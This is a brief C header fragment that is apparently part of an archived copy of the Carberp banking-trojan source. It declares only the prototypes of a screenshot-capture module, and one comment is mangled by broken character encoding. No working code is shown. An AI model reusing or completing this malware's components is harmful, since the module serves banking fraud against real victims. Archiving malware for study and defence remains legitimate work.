/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
void InitScreenLib();
DWORD WINAPI ScreensThread( LPVOID lpData );
void destroyScr();


/// ������� ����������� ��� ���������� RuBnk
void GetScreen( LPVOID *lpFile, LPDWORD dwFileSize );